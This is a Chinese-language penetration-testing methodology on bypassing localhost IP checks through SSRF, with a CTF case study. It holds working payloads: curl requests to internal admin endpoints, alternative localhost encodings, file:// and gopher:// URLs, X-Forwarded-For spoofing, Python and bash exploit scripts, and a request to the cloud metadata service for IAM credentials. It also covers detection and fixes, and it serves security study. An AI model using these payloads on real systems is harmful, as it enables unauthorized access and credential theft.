# IP 基础认证绕过攻击（通过 SSRF）

## 1. 方法论概述

### 1.1 编写目的
本方法论指导渗透测试人员识别和利用基于 IP 地址的认证机制，特别是通过服务器端请求伪造（SSRF）漏洞绕过 localhost 限制的攻击技术。

### 1.2 适用范围
- 使用 IP 地址作为唯一认证机制的应用
- 存在 SSRF 漏洞的 Web 应用
- Flask、Django 等框架中 `request.remote_addr` 检查
- 本地服务保护（127.0.0.1、localhost 限制）

### 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- 红队成员

---

## 2. 技术原理

### 2.1 漏洞本质
基于 IP 的认证机制存在根本性设计缺陷：
- 使用网络层信息（源 IP）作为应用层认证
- 无法区分真实用户和代理请求
- 当应用存在 SSRF 时，攻击者可模拟受信任 IP

### 2.2 典型代码模式

**Python Flask 示例：**
```python
@app.route('/admin')
def admin():
    if request.remote_addr != '127.0.0.1':
        abort(403)
    return render_template('admin.html')
```

**漏洞组合：**
1. IP 检查在公开端点之后执行
2. SSRF 端点可访问内部资源
3. 无二次认证机制

---

## 3. 攻击场景

### 3.1 场景 1：SSRF 绕过 IP 认证

**目标：** 访问受 IP 保护的 admin 端点

**前置条件：**
- 应用存在 SSRF 漏洞（如 urllib.request.urlopen 接受用户 URL）
- 存在 IP 保护的端点（/admin、/admin/flag 等）

**攻击步骤：**

1. **识别 SSRF 端点**
   ```bash
   # 查找接受 URL 参数的端点
   POST /convert
   Content-Type: application/x-www-form-urlencoded
   
   url=http://example.com/test
   ```

2. **测试 localhost 访问**
   ```bash
   curl -X POST http://target/convert \
     -d "url=http://127.0.0.1/admin"
   ```

3. **提取敏感数据**
   ```bash
   curl -X POST http://target/convert \
     -d "url=http://127.0.0.1/admin/flag"
   ```

**攻击流程图：**
```
外部攻击者
    ↓ POST /convert?url=http://127.0.0.1/admin/flag
Flask 应用（公开端点）
    ↓ urllib.request.urlopen("http://127.0.0.1/admin/flag")
内部请求（127.0.0.1 → 127.0.0.1）
    ↓ request.remote_addr == '127.0.0.1' ✓
/admin/flag 端点
    ↓ 返回 Flag
攻击者获取敏感数据
```

### 3.2 场景 2：替代 Localhost 表示

**绕过技巧：**
```bash
# 使用 localhost 主机名
url=http://localhost/admin/flag

# 使用 0.0.0.0
url=http://0.0.0.0/admin/flag

# 使用 IPv6 localhost
url=http://[::1]/admin/flag

# 使用十进制表示
url=http://2130706433/admin/flag

# 使用八进制表示
url=http://0177.0.0.1/admin/flag

# 使用十六进制表示
url=http://0x7f.0.0.1/admin/flag

# 包含端口号
url=http://127.0.0.1:80/admin/flag
```

### 3.3 场景 3：X-Forwarded-For 头部注入（代理环境）

**适用条件：** 应用部署在反向代理后

**攻击步骤：**
```bash
curl http://target/admin/flag \
  -H "X-Forwarded-For: 127.0.0.1"
```

**注意：** 需要代理配置不当才会生效

---

## 4. 探测与验证

### 4.1 黑盒测试

**步骤 1：识别 IP 保护端点**
```bash
# 尝试访问常见 admin 路径
curl http://target/admin
curl http://target/admin/flag
curl http://target/management
curl http://target/internal

# 观察 403 Forbidden 响应
```

**步骤 2：寻找 SSRF 端点**
```bash
# 测试 URL 处理功能
curl -X POST http://target/convert \
  -d "url=http://attacker.com/test"

# 检查服务器是否发起 HTTP 请求
```

**步骤 3：验证 SSRF 到 localhost**
```bash
# 尝试访问内部端点
curl -X POST http://target/convert \
  -d "url=http://127.0.0.1/admin"

# 如果返回 admin 页面内容，则绕过成功
```

### 4.2 白盒测试

**代码审计关键词：**
```python
# 搜索 IP 检查模式
grep -r "remote_addr" .
grep -r "127.0.0.1" .
grep -r "localhost" .

# 搜索 SSRF 危险函数
grep -r "urllib.request.urlopen" .
grep -r "requests.get" .
grep -r "file_get_contents" .  # PHP
grep -r "HttpClient" .  # Java
```

**危险模式识别：**
```python
# ❌ 危险模式
if request.remote_addr != '127.0.0.1':
    abort(403)

# ✅ 安全模式（应使用）
if not current_user.is_authenticated:
    abort(403)
```

---

## 5. 利用方法

### 5.1 基础利用

**单命令利用：**
```bash
curl -X POST http://localhost:42369/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.1/admin/flag"
```

**预期响应：**
```html
<p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
```

### 5.2 自动化利用脚本

**Python 脚本：**
```python
#!/usr/bin/env python3
import requests

TARGET = "http://localhost:42369"
SSRF_ENDPOINT = "/convert"
INTERNAL_TARGET = "http://127.0.0.1/admin/flag"

response = requests.post(
    f"{TARGET}{SSRF_ENDPOINT}",
    data={"url": INTERNAL_TARGET}
)

if "flag{" in response.text:
    print("[+] SSRF Bypass Successful!")
    print(response.text)
else:
    print("[-] Bypass Failed")
```

### 5.3 批量端点扫描

**Bash 脚本：**
```bash
#!/bin/bash
TARGET="http://localhost:42369"
ENDPOINTS=("/admin" "/admin/flag" "/internal" "/debug" "/management")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "[*] Testing: $endpoint"
    response=$(curl -s -X POST "$TARGET/convert" \
        -d "url=http://127.0.0.1$endpoint")
    
    if [[ ${#response} -gt 100 ]]; then
        echo "[+] Potential bypass: $endpoint"
        echo "$response" | head -20
    fi
done
```

---

## 6. 绕过技巧

### 6.1 URL 编码绕过

```bash
# URL 编码 localhost
url=http%3A%2F%2F127.0.0.1%2Fadmin%2Fflag

# 双重 URL 编码（绕过某些过滤器）
url=http%253A%252F%252F127.0.0.1%252Fadmin
```

### 6.2 DNS 重绑定攻击

**适用场景：** 应用检查 URL 但无 DNS 验证

**攻击步骤：**
1. 设置 DNS 重绑定服务
2. 初始解析为公网 IP（绕过检查）
3. 请求时解析为 127.0.0.1

### 6.3 协议切换

```bash
# 使用 file:// 协议读取源码
url=file:///app/app.py

# 使用 gopher://协议（如果支持）
url=gopher://127.0.0.1:80/_GET/admin/flag
```

---

## 7. 影响评估

### 7.1 直接危害
- 未授权访问管理功能
- 敏感数据泄露（Flag、配置、凭证）
- 内部服务暴露

### 7.2 潜在危害
- 结合其他漏洞实现 RCE
- 云环境元数据服务访问（IAM 凭证窃取）
- 内网横向移动

### 7.3 CVSS 评分参考
- **基础分数：** 9.1 (Critical)
- **攻击向量：** Network (AV:N)
- **攻击复杂度：** Low (AC:L)
- **权限要求：** None (PR:N)
- **用户交互：** None (UI:N)
- **机密性影响：** High (C:H)
- **完整性影响：** Low (I:L)
- **可用性影响：** None (A:N)

---

## 8. 修复建议

### 8.1 架构层面

**❌ 不推荐：仅依赖 IP 认证**
```python
if request.remote_addr != '127.0.0.1':
    abort(403)
```

**✅ 推荐：使用真正的认证机制**
```python
from flask_login import login_required, current_user

@app.route('/admin')
@login_required
def admin():
    if not current_user.is_admin:
        abort(403)
    return render_template('admin.html')
```

### 8.2 SSRF 防护

**URL 验证：**
```python
from urllib.parse import urlparse
import socket
import ipaddress

def is_safe_url(url):
    parsed = urlparse(url)
    
    # 只允许 http/https
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # 解析域名
    hostname = parsed.hostname
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # 阻止私有 IP
        if ip_obj.is_private or ip_obj.is_loopback:
            return False
    except:
        return False
    
    return True
```

### 8.3 深度防御

1. **网络层：** 防火墙规则限制内部访问
2. **应用层：** 真正的认证 + 授权
3. **SSRF 防护：** URL 白名单 + IP 黑名单
4. **监控：** 异常请求检测

---

## 9. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Testing](https://portswigger.net/web-security/ssrf)
- [CVE-2021-41773 Apache Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## 10. 实战案例

### 10.1 CTF 挑战案例

**目标：** Flask Markdown 转换器应用

**漏洞组合：**
1. SSRF 在 `/convert` 端点
2. IP 认证保护 `/admin/flag`
3. 无其他防护措施

**利用命令：**
```bash
curl -X POST http://localhost:42369/convert \
  -d "url=http://127.0.0.1/admin/flag"
```

**结果：** 成功获取 Flag `flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}`

### 10.2 云环境案例

**目标：** AWS EC2 部署的应用

**攻击链：**
1. SSRF 访问元数据服务
2. 获取 IAM 角色凭证
3. 使用凭证访问 AWS 资源

**利用命令：**
```bash
curl -X POST http://target/convert \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
